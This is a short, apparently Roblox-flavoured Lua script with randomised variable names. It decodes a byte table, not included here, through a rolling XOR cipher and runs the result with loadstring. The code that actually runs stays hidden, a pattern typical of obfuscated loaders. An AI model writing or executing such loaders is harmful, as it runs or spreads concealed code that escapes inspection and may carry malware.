local solhls22,ddvnyo40=111,25
local dpbtjl23={}
for ddhcob80=1,#jlxdkl71 do
  local euntvf93=jlxdkl71[ddhcob80]
  euntvf93=bit32.bxor(euntvf93,ddvnyo40)
  euntvf93=(euntvf93-solhls22+256)%256
  dpbtjl23[ddhcob80]=euntvf93
  solhls22=(solhls22*13+7)%256;ddvnyo40=(ddvnyo40*17+11)%256
end
local uhwbci33=""
for ddhcob80=1,#dpbtjl23 do uhwbci33=uhwbci33..string.char(dpbtjl23[ddhcob80])end
local _f,_e=loadstring(uhwbci33)
if _f then _f() else warn(tostring(_e)) end
